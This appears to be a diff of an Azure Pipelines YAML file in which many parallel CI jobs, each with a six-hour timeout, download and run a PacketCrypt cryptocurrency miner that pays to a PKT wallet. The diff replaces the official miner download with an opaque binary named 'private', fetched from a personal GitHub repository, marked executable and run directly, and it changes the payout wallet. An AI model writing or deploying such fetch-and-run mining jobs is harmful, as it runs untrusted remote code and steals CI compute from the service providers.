-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p  pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: cb
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: cc
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: cd
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: ce
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: cf
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: cg
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: ch
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: ci
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: cj
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: ck
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p  pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: cl
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: cm
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: cn
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: co
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: cp
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: cq
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: cr
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: cs
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: ct
   timeoutInMinutes: 360
